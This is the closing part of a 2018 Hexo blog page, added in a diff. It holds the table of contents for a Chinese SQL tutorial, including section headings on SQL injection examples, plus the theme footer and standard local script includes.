+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL概述"><span class="nav-number">1.</span> <span class="nav-text">SQL概述</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是SQL"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">什么是SQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#作用"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">作用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库的分类"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">数据库的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#关系型："><span class="nav-number">1.0.0.3.1.</span> <span class="nav-text">关系型：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#非关系型NOSQL"><span class="nav-number">1.0.0.3.2.</span> <span class="nav-text">非关系型NOSQL</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL命令"><span class="nav-number">2.</span> <span class="nav-text">SQL命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#类型"><span class="nav-number">2.0.1.</span> <span class="nav-text">类型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#数据控制语言"><span class="nav-number">2.0.1.0.1.</span> <span class="nav-text">数据控制语言</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#数据定义语言"><span class="nav-number">2.0.1.0.2.</span> <span class="nav-text">数据定义语言</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#数据操作语言"><span class="nav-number">2.0.1.0.3.</span> <span class="nav-text">数据操作语言</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DCL常用"><span class="nav-number">2.0.2.</span> <span class="nav-text">DCL常用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DDL常用语句"><span class="nav-number">2.0.3.</span> <span class="nav-text">DDL常用语句</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#数据库层面"><span class="nav-number">2.0.3.0.1.</span> <span class="nav-text">数据库层面</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#数据表层面："><span class="nav-number">2.0.3.0.2.</span> <span class="nav-text">数据表层面：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DML常用语句"><span class="nav-number">2.0.4.</span> <span class="nav-text">DML常用语句</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL安全相关"><span class="nav-number">3.</span> <span class="nav-text">SQL安全相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用函数"><span class="nav-number">3.0.1.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入常用实例"><span class="nav-number">3.0.2.</span> <span class="nav-text">注入常用实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断网站的数据库类型"><span class="nav-number">3.0.3.</span> <span class="nav-text">判断网站的数据库类型</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shiqian</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
